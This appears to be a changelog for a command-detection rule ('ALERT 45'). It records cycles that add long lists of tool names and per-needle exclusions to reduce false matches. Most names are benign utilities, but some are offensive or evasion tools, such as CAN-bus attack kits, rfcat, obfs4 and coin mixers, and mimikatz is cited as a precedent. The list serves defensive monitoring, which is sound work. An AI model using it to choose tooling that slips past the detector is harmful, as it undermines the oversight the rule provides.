- **ALERT 45 (cycle 276):** chatbot/messaging-cli/web-archive/kiwix/maps/gdal/lidar/photogrammetry/3d-tool + netsim/sdn/p4/dpdk/telecom/proj/routing/iot/coap/lorawan/building/grid/meter/geocode primitives (~100 needles): hubot/opsdroid/matterbot/rasa/tg/tdl/tdlib/slack-term/wee-slack/chat-downloader/twitch-dl; warcio/warcit/browsertrix/pywb/heritrix/webarchiveplayer/kiwix-serve/kiwix-manage/zimdump; tile38/tileserver-gl/osm2pgsql/pelias/osmctools; gdal_translate/gdalwarp/gdalinfo/gdal_merge/gdalbuildvrt/gdaldem/gdal_rasterize/ogr2ogr/ogrinfo/rio; pdal/las2las/laszip/lasinfo/cloudcompare; odm/micmac/openmvg/opensfm/colmap/alicevision/mve; meshlabserver/pcl_viewer/assimp/meshconv/obj2gltf/gltf-pipeline/gltf-transform; ns-3/ns3/omnetpp/mininet-wifi/coreemu/imunes/pox/floodlight/trema; p4c/behavioral-model/p4runtime/dpdk-testpmd/pktgen-dpdk/libmoon/ueransim/seagull/jss7/sigtran; cs2cs/geod/cct/gie/spatialite/osrm-backend/graphhopper/motis/mainflux/kubeedge/akri/libcoap/aiocoap/chirpstack/ttn-cli/lora-gateway/volttron/haystack/nhaystack/gridlabd/matpower/pypower/powsybl/iec62056/guruux/libpostal/pelias-schema - real-word forms gated on ' -' with per-needle exclusions (tg->!itg/!etg, cct->!acct); ns3-docs/volttron-docs moved to hits (design-internal firing).
- **ALERT 45 (cycle 275):** nvr-surveillance/iptv/playout/webrtc-sfu/edu + video-encode/subtitle/music-prod/tracker/audio-analysis/asr/diarize/voice-clone/noise + emulation/game-port/vintage-sim/mcu-sim/ebpf/crashdump/boot-trace/secureboot primitives (~150 needles): frigate/viseron/kerberos-agent/bluecherry/shinobi/scrypted/tvheadend/vdr/mythbackend/nextpvr/dvbscan/w_scan; casparcg/red5/mistserver/antmedia/livekit-server/mediasoup/janus-gateway/ion-sfu/openvidu/galene/jitsi-videobridge/jicofo/jigasi/chamilo/ilias; kdenlive-render/lossless-cut/ab-av1/svt-av1/rav1e/x264/x265/kvazaar/vvenc/av1an/vmaf/gaupol/subtitlecomposer/ccextractor/ffsubsync/alass; lmms/ardour/hydrogen/zrythm/carla/cadence/non-sequencer/rosegarden/musescore/denemo/lilypond/frescobaldi/pt2-clone/ft2-clone/furnace/0cc-famitracker/hivelytracker; sonic-annotator/aubio/yaafe/bextract/deepspeech/pocketsphinx/kaldi/julius/pyannote/resemblyzer/so-vits-svc/tortoise-tts/rnnoise/deepfilternet; dosbox-x/dosbox-staging/fuse-emu/vice/fs-uae/hatari/stella/mess/desmume/melonds/citra/yuzu/ryujinx/cemu/rpcs3/xemu/duckstation/flycast/redream/higan/bsnes/snes9x/zsnes/fceux/nestopia/gambatte/mgba/vbam/ppsspp/jpcsp/openemu; openxcom/ufoai/openmw/openra/openage/wesnoth/openttd/simutrans/openrct2/openloco/corsixth/openbve/flightgear/vdrift/speed-dreams/torcs/supertuxkart/tuxpaint; dosemu/dosemu2/basilisk2/sheepshaver/simh/klh10/hercules-390/s390-tools/open-simh/cool-retro-term/simavr/simulide/gpsim/simulavr/skyeye/drgn/bpfmenu/xdpdump/pcapplusplus/kubectl-trace/pstack/bootchart/bootchart2/systemd-bootchart/fwts/sbsigntool/sbverify - real-word forms gated on ' -' with per-needle exclusions (vice->!service/!advice/!device, mess->!messag, hydrogen->!hydrogen-, etc.); gaupol-docs moved to hit (existing gau needle precedent).
- **ALERT 45 (cycle 274):** llm/tts/imagegen/mlops + notebook/data-eng/db-client/data-quality/cdc/bi/spreadsheet/forms/diagram/rss/podcast/ebook/comics/recipe/finance/library/genealogy primitives (~98 needles): llama-cli/koboldcpp/gpt4all/tgi/jan/gptme/tabby/mentat/open-interpreter/interpreter; whisper-cli/whisperx/stable-ts/faster-whisper/bark/tts/coqui/xtts/rvc/audiocraft; comfy-cli/fooocus/a1111/automatic1111/cog; bentoml/tritonserver/seldon/kserve/polyaxon; nteract/streamlit/gradio/voila/nicegui/marimo/papermill/nbconvert/nbdime/nbstripout; sqlmesh/datahub/openmetadata/marquez/lazysql/harlequin/dbgate/great-expectations/elementary; debezium-server/peerdb/sequin/superset-cli/redash/lightdash/cube/dremio; grist/baserow/nocodb/rowy/teable/apitable/undb/formbricks/d2/svgbob; freshrss/tt-rss/miniflux/selfoss/commafeed/rssguard/fluent-reader/rss2email; castget/podget/podcast-dl/gpo/audiobookshelf/lazylibrarian; koreader/epubcheck/kepubify/kindlegen/sigil/komga/kavita/mcomix/mealie/tandoor/grocy/actual-server/ghostfolio/koha/biblioteq/gramps/webtrees - real-word forms gated on ' -' with per-needle exclusions (bark->!embark, cog->!incog, cube->!icecube, tts->!otts/!atts, etc.); existing-bare collisions resolved (emba->!embark); nteract gated !interact.
- **ALERT 45 (cycle 273):** canbus/plc/cnc/laser/pcb/rf/rfid/smartcard/hsm-tpm/fido/barcode/label/pos + asset/cmdb/dcim/ipam/aaa/dot1x/vpn/wg/portknock/sms/sim/cellular/ais/seismic/geophysics/physics/astro primitives (~98 needles): socketcand/kayak/cantoolz/caringcaribou/udsim/icom/savvycan; openplc/matiec/beremiz/linuxcnc/grbl/fluidnc/bcnc/cncjs/ugs/chilipeppr; laserweb/visicut/inkcut/pcb2gcode/flatcam; qspectrumanalyzer/rfcat/rflib/libnfc/nfc-tools/pcsc-tools/ccid/pkcs15-tool; opencryptoki/tpm2-tss/tpm2-abrmd/tang/fido2luks/pam-u2f/solo1-cli; zint/brother_ql/ptouch/dymoprint/escpos; snipeit/glpi/fusioninventory/racktables/i-doit/cmdbuild/ralph/phpipam/nipap/teemip; daloradius/packetfence/tacacs-ng/xsupplicant; softether/dsvpn/vtund/wgcf/onetun/knockd/knock/fwknop; playsms/jasmin-sms/lpac/sysmo-usim-tool; osmo-bsc/hlr/msc/sgsn/ggsn/pcu/cbc; gnuais/aisutils; seedlink/seiscomp/slinktool/dataselect/obspy; gmt/madagascar/seismic-unix/openmc/geant4/cernlib/herwig/sherpa/madgraph; gildas/aips/casa/miriad/iraf/orekit/gmat - real-word forms gated on ' -' with per-needle exclusions (ugs->!bugs/!plugs, tang->!mustang, casa->!showcase, etc.); orekit-docs moved to hit (coined-name design-internal).
- **ALERT 45 (cycle 272):** git-extra/convert/mail-infra/spam-filter/lists/caldav/irc/xmpp/matrix/voip-server + fediverse/pastebin/urlshort/bookmark/docsrv/fileshare/gallery/kanban/cms/ecomm/crm primitives (~107 needles): jujutsu/git-branchless/git-secret*/git-quick-stats/git-extras/gitui/gitbutler/git-cliff/convco/cz-cli/semantic-release/release-please; quilt/wiggle/recode/uconv/convmv/detex/untex/catdoc/docx2txt/unrtf/antiword/wvtext; dma/maddy/stalwart-mail/zone-mta/rspamd/mimedefang/amavis/dcc; listmonk/mlmmj/schleuder/dada/imapsync; radicale/baikal/davical/sogo/xandikos; ircd-hybrid/miniircd/openfire/conduit/conduwuit/matrix-appservice-irc/matrix-hookshot/heisenbridge/mx-puppet/murmur/umurmur/revolt; misskey/akkoma/pleroma/gotosocial/pixelfed/owncast/mastodon-tootctl; privatebin/fiche/pastebinit/shlink/yourls/kutt/polr; wallabag/shaarli/linkding/linkwarden/archivebox/hedgedoc/joplin-server/memos/flatnotes/silverbullet/bookstack; snapdrop/localsend/psitransfer/lychee/piwigo/librephotos/immich/stagit/gitiles/gitweb/forgejo; taskd/planka/wekan/focalboard/kanboard/taiga/directus/strapi/sanity-cli/contentful-cli/saleor/vendure/shopify-cli/square-cli/monica/twenty - real-word forms gated on ' -' with per-needle exclusions; existing-bare collisions resolved (ecode->!recod, taig->!taiga, dma->!sendma/!grandm).
- **ALERT 45 (cycle 271):** mesh/lora/sdr-radio/usenet/smallnet/anon/overlay/userspace-net + dnsdist/osint/sandbox/forensics/log/ir/malware-analysis/bindiff/firmware/container/k8s/serverless/faas primitives (~97 needles): rnode/rns/meshcore/xastir/qsstv/freedv/codec2/cubicsdr; nntpcache/leafnode/tin/slrn/pan/hellanzb; sacc/lagrange/amfora/bombadillo/offpunk/gmni/gtl/ddgr/googler; obfs4/obfsproxy/dnscrypt/wireguard-go/boringtun/vde2/slirp/slirp4netns/pasta/gvisor-tap-vsock/arpd/netdiscover/bgpq3/bgpq4/rpsl/peeringdb/routeview; dnsdist/socialscan/cape/vt-cli/malwoverview/msoffcrypto; ils/blkls/tsk_recover/tsk_loaddb/ewfacquire/ewfinfo/ewfmount/affacquire/affinfo/affmount/qphotorec; lnav/goaccess/multitail/sigma-cli/log2timeline/plaso/timesketch/kape/kansa; ghidra-headless/angr/miasm/quark/yara-x/bindiff/diaphora/jdiff/bsdiff/courgette/zydis/srec_cat/srecord/unblob/yaffshiv; dive/dockle/hadolint/rootlesskit/ksniff/kubefwd/kubent/fairwinds/datree/digger/meshctl/claudia/apex/kubeless/faasd/openfaas-cli - real-word forms gated on ' -' with per-needle exclusions (tin->'tin ' boundary, pan->!cpan/!pand/!pant, angr->!angry, cape->!escape/!landscap, dive->!diver/!endive); existing-bare collisions resolved (pex->!apex, rnode->!supernode); quark-particle moved to hit (particle needle precedent).
- **ALERT 45 (cycle 270):** uav/robotics/ot-ics/energy/aviation/marine/weather + miner/wallet/mev/validator/l2/bridge/oracle/indexer/cosmos/mixer/privacy/signing primitives (~97 needles, 7 domains): ardupilot/qgroundcontrol/mission-planner/px4/ros2/rosbag/rviz/gazebo/moveit; eibd/linknx/eibnetmux/openems/victron/solaredge/fronius/enphase/evcc/ocpp; readsb/tar1090/acarsdec/vdlm2dec; opencpn/signalk/canboat/weewx/cumulus/pywws; bminer/dogecoin-cli/wownero/grin/beam-wallet/ravencoin-cli; mev-boost/flashbots; ethdo/ssv-network/diva/obol/lodestar/grandine/nethermind/reth/helios/erigon; op-node/op-geth/nitro/zksync/bor; axelard/gravity-bridge/connext; chainlink/pyth/api3/tellor/dia; graph-node/graph-cli/subsquid/ponder/envio/goldsky; binance-chain/bnbcli/terrad/dymension/kujira/neutron/stride/akash-provider/fetchd/regen/chihuahua/comdex/omniflix/quicksilver/umee/stargaze/agoric/crescent/secretcli; wasabi/whirlpool/samourai/joinmarket/coinjoin; zano/firo/mobilecoin/bee-clef/horcrux/tmkms/cosmovisor — real-word forms gated on ` -` or literal subcommand, docs-mention firing on coined names is design-internal (same class as mimikatz); existing-bare `trid` collision with `stride` resolved via `!strid`; `pyth` gated `!pytho` for python -m invocations; pre-existing benigns ardupilot-docs/diva-singer moved to hits (singer needle precedent).

